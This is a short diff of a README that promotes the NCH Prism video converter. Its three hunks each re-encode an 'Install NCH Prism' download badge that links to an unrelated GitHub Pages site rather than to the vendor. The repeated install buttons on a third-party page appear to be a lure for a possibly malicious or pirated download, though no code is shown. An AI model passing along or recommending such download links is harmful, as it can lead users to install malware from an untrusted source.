@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH%20Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH+Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ NCH Prism is a video file converter from NCH Software that supports conversion b
 
 <div align="center">
 
-[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH%20Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH+Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ NCH Prism is a video file converter from NCH Software that supports conversion b
 
 <div align="center">
 
-[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH%20Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install NCH Prism](https://img.shields.io/badge/⬇_Install_NCH+Prism-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
